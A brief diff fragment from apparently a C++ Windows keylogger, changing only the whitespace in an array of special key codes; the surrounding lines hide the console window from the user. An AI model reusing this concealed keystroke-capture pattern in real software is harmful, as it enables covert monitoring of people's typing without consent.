@@ -89,8 +89,8 @@ string translateKey(int key) {
 
 // Main function
 int main() {
-	int specialKeyArray[25] = { VK_SPACE, VK_CAPITAL, VK_ESCAPE, VK_TAB, VK_SHIFT, VK_CONTROL, VK_MENU, VK_BACK, VK_RETURN, VK_UP, VK_DOWN, VK_RIGHT, VK_LEFT,
-							 VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12 };
+	int specialKeyArray[25] = {	VK_SPACE, VK_CAPITAL, VK_ESCAPE, VK_TAB, VK_SHIFT, VK_CONTROL, VK_MENU, VK_BACK, VK_RETURN, VK_UP, VK_DOWN, VK_RIGHT, VK_LEFT,
+					VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12 };
 	// Hide window
 	HWND hwnd = GetConsoleWindow();
 	ShowWindow(hwnd, SW_HIDE);
